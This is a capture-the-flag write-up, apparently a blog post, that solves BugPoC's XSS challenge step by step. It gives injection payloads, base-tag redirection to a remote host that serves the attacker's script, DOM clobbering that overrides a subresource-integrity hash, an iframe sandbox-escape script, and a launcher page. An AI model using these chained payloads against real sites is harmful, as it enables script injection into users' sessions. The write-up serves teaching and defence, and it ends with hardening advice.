@@ -1,0 +1,311 @@
+<p><a href="https://abankalarm.medium.com/?source=post_page-----d10d43d7707c--------------------------------"><img src="https://miro.medium.com/fit/c/96/96/0*8_mwiJZZEno1zqp4" alt="karan bamal" /></a><a href="https://abankalarm.medium.com/?source=post_page-----d10d43d7707c--------------------------------">karan bamal</a><a href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fd5df946c3471&amp;operation=register&amp;redirect=https%3A%2F%2Finfosecwriteups.com%2Fwacky-xss-challenge-with-amazon-by-bugpoc-d10d43d7707c&amp;user=karan%20bamal&amp;userId=d5df946c3471&amp;source=post_page-d5df946c3471----d10d43d7707c---------------------follow_byline-----------">Follow</a><a href="https://medium.com/wacky-xss-challenge-with-amazon-by-bugpoc-d10d43d7707c?source=post_page-----d10d43d7707c--------------------------------">Nov 10, 2020</a> · 7 min read</p>
+
+<p>Hey, welcome to the write up for wacky XSS challenge. Throughout the write-up, i will try to not to limit myself just to the payloads or steps i specifically used but will also give you guys a front row seat to the thinking process that went behind successful completion of this challenge.</p>
+
+<p>The challenge was located at <a href="https://wacky.buggywebsite.com/">https://wacky.buggywebsite.com/</a> and ended on 9th november 10pm EDT.</p>
+
+<p>I am gonna divide the challenge into several parts for better explanation:</p>
+
+<p>lets start</p>
+
+<h1 id="1-the-initial-foothold-html-injection"><strong>1. The initial foothold html injection</strong></h1>
+
+<p>You are greeted with this input field when you enter the challenge, after going around a bit i realised it has just 2 pages plus few scripts as well.</p>
+
+<p><img alt="" class="t u v jp aj" src="https://miro.medium.com/max/2196/1\*wB1fqQOddGPBen0cM4vI4g.png" width="1098" height="885" srcset="https://miro.medium.com/max/552/1\*wB1fqQOddGPBen0cM4vI4g.png 276w, https://miro.medium.com/max/1104/1\*wB1fqQOddGPBen0cM4vI4g.png 552w, https://miro.medium.com/max/1280/1\*wB1fqQOddGPBen0cM4vI4g.png 640w, https://miro.medium.com/max/1400/1\*wB1fqQOddGPBen0cM4vI4g.png 700w" sizes="700px" role="presentation" /></p>
+
+<p>the home page</p>
+
+<p>Our text was reflected on the iframe page inside, simply viewing frame source revealed our text was getting reflected at 2 places.</p>
+
+<ol>
+  <li>title tag</li>
+  <li>the boring text with each letter in different font</li>
+</ol>
+
+<p>A very simple payload would reveal that the title tag is vulnerable to html injection</p>
+
+<blockquote>
+  <p>&lt;/title&gt;<script>alert(1)</script></p>
+</blockquote>
+
+<p>Our script obviously doesnt execute thanks to a defence mechanism called Content Security Policy. So lets move on to the next step.</p>
+
+<p>We are in, so let the games begin.</p>
+
+<h1 id="2-outsmarting-the-csp">2. Outsmarting the CSP</h1>
+
+<p>Go to network tab and look at the page headers:</p>
+
+<blockquote>
+  <p><strong>content-security-policy:</strong> script-src ‘nonce-ucbgymcgoplw’ ‘strict-dynamic’; frame-src ‘self’; object-src ‘none’;</p>
+</blockquote>
+
+<p>few things to focus here:</p>
+
+<ol>
+  <li>nonce — this makes it impossible to render any javascript until we have the randomly generated nonce value as the part of our script header. Since this changes every single time page reloads and theres no way we can predict it beforehand.</li>
+  <li>frame-src —this specifies valid sources for nested browsing contexts loading using elements such as <frame> and &lt;iframe&gt;. [more here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src)</frame></li>
+</ol>
+
+<p>If we get nonce, we can esentially run any script. So, naturally first we gonna try leak it somehow. There were several resources on this but unfortunately none actually works for us. So not-defeated, just keeping this aside, i try to poke around a bit.</p>
+
+<p><a href="https://csp-evaluator.withgoogle.com/"><em>https://csp-evaluator.withgoogle.com/</em></a> <em>— because we love to automate stuff</em></p>
+
+<p>Enter your csp above here, and we get a critical a high severity finding error</p>
+
+<blockquote>
+  <p><strong>base-uri</strong>[missing]</p>
+
+  <p>Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. Can you set it to ‘none’ or ‘self’?</p>
+</blockquote>
+
+<p><strong>so what is base-uri or base tag?</strong></p>
+
+<p>Lets say the webpage has a html tag <em>&lt;xxx src=/path&gt;,</em> in other words whenever relative paths are used instead of the whole url, the page completes this as <em>www.origin/path</em> however if the base tag(e.g.<code class="language-plaintext highlighter-rouge">&lt;base target="_blank" href="https://example.com/"&gt;</code>)is present. Then its resolved to https://<em>example.com/path</em> despite whatever page its on. <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base">read more</a>.</p>
+
+<p>So lets hunt for what all things are loaded from relative path:</p>
+
+<ol>
+  <li>script.setAttribute(‘src’, ‘files/analytics/js/frame-analytics.js’);</li>
+  <li>&lt;source src=”movie.mp4” type=”video/mp4”&gt;</li>
+</ol>
+
+<p>So we have 2 cases in which we can force the page to load our file instead.</p>
+
+<p>In the 2nd case since type is mp4, you can load any arbitary mp4 and cause to <strong><em>remote file inclusion</em></strong> but thats really not our motive here.</p>
+
+<p>So unless we find a vuln in the video parsing library of chrome and load a malicious video we cannot really cause an XSS.</p>
+
+<p>Now, onto first — here a defence called <strong>subresource integrity</strong> has been applied.</p>
+
+<p><em>Why is this a big deal?</em><br />
+Because what this does is it loads the hash value of contents of the script and compares it with a hardcoded hash, so even if we are able to inport our own script we cant really change it to anything else other than the real script introduced by the developer. <a href="https://w3c.github.io/webappsec-subresource-integrity/">more here</a>.</p>
+
+<p>Present payload:</p>
+
+<blockquote>
+  <p>&lt;/title&gt;&lt;base target=”iframe” href=”https://xxxxx.redir.bugpoc.ninja/”&gt;</p>
+</blockquote>
+
+<p>Here i am using <a href="https://bugpoc.com/testers/other/mock">mock endpoint</a> as well as <a href="https://bugpoc.com/testers/other/redir">flexible redirector</a> by bugpoc, since its so so much easier than hosting a file over https server and constantly making changes to it and defining headers for it.</p>
+
+<p><em>looks like….</em></p>
+
+<p>We obviously cannot let subresource integrity stand in our way.</p>
+
+<h1 id="3-defeating-the-subresource-integrity">3. Defeating the Subresource Integrity</h1>
+
+<p>A hacker’s worst nightmare — a hash function.</p>
+
+<p>Since the subresource is being hashed and compared to a hard coded value, we really have only 3 choices:</p>
+
+<ol>
+  <li>Find an exception in implementaion of SRI where it skips validation.</li>
+  <li>Create a different malicious script with same hash.</li>
+  <li>Change the value we are comparing it to.</li>
+</ol>
+
+<p>Since CVE-2016–1636, which was patched in Google Chrome 49.0.2623.75, There isnt any known exploit affecting the library. So the 1st choice is off the table.</p>
+
+<p>We all know hash collisions exist. But only theoritically. So, I had rule out the 2nd choice as well.</p>
+
+<p>So we have just 3rd choice left, which also seems impossible. <em>or is it?</em></p>
+
+<h2 id="dom-clobbering-to-rescue">DOM CLOBBERING TO RESCUE!!!</h2>
+
+<p>Heres a snippet from the page source:</p>
+
+<blockquote>
+  <script nonce="xxxxxxxx">  
+window.fileIntegrity = window.fileIntegrity || {  
+‘rfc’ : ‘ [https://w3c.github.io/webappsec-subresource-integrity/',](https://w3c.github.io/webappsec-subresource-integrity/',)  
+‘algorithm’ : ‘sha256’,  
+‘value’ : ‘unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=’,  
+— snip —
+</script>
+</blockquote>
+
+<p>“A common pattern used by JavaScript developers is:</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>_var someObject = window.someObject</td>
+      <td> </td>
+      <td>{};_</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>If you can control some of the HTML on the page, you can clobber the someObject reference with a DOM node, such as an anchor…”</p>
+
+<p>This is well explained <a href="https://portswigger.net/web-security/dom-based/dom-clobbering">here</a>.</p>
+
+<p>But the common payloads like:</p>
+
+<blockquote>
+  <p>&lt;form id=”fileIntegrity”&gt;&lt;a id=”fileIntegrity” name=”value” href=”d8Ic1uV7IeB50l……..GWd12CUZbfm8czJw=”&gt;</p>
+</blockquote>
+
+<p>wont cut it here, because since we are using base tag as well, it gets modified to</p>
+
+<blockquote>
+  <p>sha256-www.redir.com/d8Ic1uV……….d12CUZbfm8czJw=</p>
+</blockquote>
+
+<p>instead of</p>
+
+<blockquote>
+  <p>sha256-d8Ic1uV7I………Wd12CUZbfm8czJw=</p>
+</blockquote>
+
+<p>After a bit of reading around, i finally formulated another payload — which can be found <a href="https://portswigger.net/research/dom-clobbering-strikes-back">here</a> as well.</p>
+
+<p>so our payload until now is:</p>
+
+<blockquote>
+  <p>&lt;/title&gt;&lt;base target=”iframe” href=”https://xxxxxxxx.redir.bugpoc.ninja/”&gt;<output id="fileIntegrity">s7ukMoQThWrleJgNJPZfhm0YhrdECzffE0ZjASRRO0U=</output></p>
+</blockquote>
+
+<p>We have basically declared a global variable(which overrides the hardcoded one):<br />
+<em>fileIntegrity.value=the_ hash_of_our_file //you can try this in console</em></p>
+
+<p>P.S. to obtain the hash there are several ways, however entering the payload with wrong hash displays the right one in console so its just the fastest one.</p>
+
+<p>We cannot yet pop alert right now due to iframe sandboxing but go on, try having console.log(“hacked”) inside your js file ;) you deserve some serotonin.</p>
+
+<p>intercepted a message from:SRI to:iframe-sandbox //chapter 4 - The last desperate attempt to stop us</p>
+
+<h1 id="4-breaking-out-of-the-sandbox">4. Breaking out of the sandbox</h1>
+
+<p>Our challenge is to display an alert box, if you look here</p>
+
+<blockquote>
+  <p>// create a sandboxed iframe<br />
+analyticsFrame = document.createElement(‘iframe’);<br />
+analyticsFrame.setAttribute(‘sandbox’, ‘<strong>allow-scripts allow-same-origin</strong>’);<br />
+analyticsFrame.setAttribute(‘class’, ‘invisible’);<br />
+document.body.appendChild(analyticsFrame);</p>
+</blockquote>
+
+<p>Since our script is loaded inside an iframe, to be able to display an alert box we need an attribute <em>allow-modal</em> which is not present here.</p>
+
+<p>Stop googling for iframe sandbox bypass already, you wont find anything worthwhile, however if you go <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe">here</a> and scroll down and down and down.<br />
+You will see a warning message.</p>
+
+<blockquote>
+  <p><strong>Notes about sandboxing:</strong></p>
+
+  <p>When the embedded document has the same origin as the embedding page, it is <strong>strongly discouraged</strong> to use both <code class="language-plaintext highlighter-rouge">allow-scripts</code> and <code class="language-plaintext highlighter-rouge">allow-same-origin</code>, as that lets the embedded document remove the <code class="language-plaintext highlighter-rouge">sandbox</code> attribute — making it no more secure than not using the <code class="language-plaintext highlighter-rouge">sandbox</code> attribute at all.</p>
+</blockquote>
+
+<p>Our script to the original iframe with sandboxing.</p>
+
+<p>So we have to write a script that will remove the iframe and replace it with one without restriction. You following along? This sounds easy but in-reality there was really not much information on this.</p>
+
+<p><a href="https://github.com/dusekdan/RandomSecurity/tree/master/iframeSandboxDiscouragedCombination">Dusekdan</a> offers us the poc for this —sadly however it really wont work for us right off the bat so heres my code with few tune ups(i haven’t deleted some of the original code for this presentation because it gives a good visualisation):</p>
+
+<blockquote>
+  <p>const illegalCode = () =&gt; {<br />
+alert(“You should not see me, because original iframe did not have ‘allow-modals’. iframe had allow-scripts and same-origin though. A new iframe without sandbox attribute was created — and here I am.”);<br />
+//sadly this doesnt fire anyway<br />
+}</p>
+
+  <p>const escape = () =&gt; {<br />
+document.body.innerText = “Loaded into a frame.”;</p>
+
+  <p>let parent = window.parent;<br />
+let container = parent.document.getElementsByTagName(“iframe”)[0];<br />
+if (parent.document.getElementsByTagName(“iframe”)[0] != null) {<br />
+// Recreate and insert an iframe without sandbox attribute that<br />
+// plays by our rules.<br />
+let replacement = parent.document.createElement(“iframe”);<br />
+replacement.setAttribute(“id”, “escapedAlready”);<br />
+//instead of using src to this script again which wont work for us thanks to<br />
+//frame-src self csp, a clean work around was to enter data inside script tag<br />
+let g = document.createElement(“script”);<br />
+g.innerHTML = “alert(origin)”;<br />
+replacement.appendChild(g);<br />
+parent.document.body.append(replacement);</p>
+
+  <p>// Remove original iframe (avoid an infinite loop)<br />
+container.parentNode.removeChild(container);</p>
+
+  <p>//code in the else statement wont work for us since we arent opening this script //again<br />
+} else {<br />
+illegalCode();<br />
+}<br />
+}</p>
+
+  <p>escape();</p>
+</blockquote>
+
+<p>What we did it we from inside the iframe went to the parent document, selected the tag then in replacement created an iframe again but without sandbox attribute and inside it we added our little script.</p>
+
+<p>So go <a href="https://bugpoc.com/testers/other/mock"><em>mock endpoint</em></a>  by bugpoc and save this script, then to <a href="https://bugpoc.com/testers/other/redir"><em>flexible redirector</em></a> and paste the link there and get the url to be inserted in base tag.</p>
+
+<p>Dont forget to add header</p>
+
+<blockquote>
+  <p>access-Control-Allow-Origin: *</p>
+</blockquote>
+
+<p>Our payload now finally:</p>
+
+<blockquote>
+  <p>&lt;/title&gt;&lt;base target=”iframe” href=”<a href="https://zu2i14sjykqz.redir.bugpoc.ninja/">https://zu2i14sjykqz.redir.bugpoc.ninja/</a>”&gt;<output id="fileIntegrity">s7ukMoQThWrleJgNJPZfhm0YhrdECzffE0ZjASRRO0U=</output></p>
+</blockquote>
+
+<p>Our payload^</p>
+
+<h1 id="5-automate-entering-this-payload">5. Automate entering this payload</h1>
+
+<p>But convincing the victim to enter this in his webpage is a little too much.</p>
+
+<p>If you just go to inspect element you will see the url of iframe with our payload.</p>
+
+<p>Copy and paste the link in the new tab.</p>
+
+<p><strong>It doesnt work, because the page needs to be loaded inside an iframe.</strong></p>
+
+<p>lets look at the code again for the last time:</p>
+
+<blockquote>
+  <p>// verify we are in an iframe<br />
+if (window.name == ‘iframe’){</p>
+</blockquote>
+
+<p>so lets do just some more scripting for the <a href="https://www.youtube.com/watch?v=BPgEgaPk62M">one last time</a>:</p>
+
+<blockquote>
+  <html>  
+<body>
+
+<p>Click the button to commence attack</p>
+
+&lt;button onclick=”myFunction()”&gt;the button&lt;/button&gt;
+
+<script>
+
+function myFunction() {  
+myWindow = window.open(“[https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20target=%22iframe%22%20href=%22https://zu2i14sjykqz.redir.bugpoc.ninja/%22%3E%3Coutput%20id=fileIntegrity%3Es7ukMoQThWrleJgNJPZfhm0YhrdECzffE0ZjASRRO0U=%3C/output%3E](https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20target=%22iframe%22%20href=%22https://zu2i14sjykqz.redir.bugpoc.ninja/%22%3E%3Coutput%20id=fileIntegrity%3Es7ukMoQThWrleJgNJPZfhm0YhrdECzffE0ZjASRRO0U=%3C/output%3E)", “iframe”, “width=2000,height=1000”);  
+}
+
+</script>
+</body></html>
+</blockquote>
+
+<p>Opening a window and naming it as iframe does the trick and we get our beautiful alert box displaying origin and then one by amazon thanking us for our participation.</p>
+
+<p>pwnd</p>
+
+<h1 id="stay-safe">Stay safe</h1>
+
+<p>All the attack above are caused when developer trusts out of the box defence solutions too much.</p>
+
+<blockquote>
+  <p>A fortress is only as strong as its weakest point.</p>
+</blockquote>
+
+<p>The underlying principle is to strengthen each phase of defence mechanism, and to enforce a zero-trust-policy. The user input should always be considered malicious. <strong>Thankyou for reading! and until next time.</strong></p>
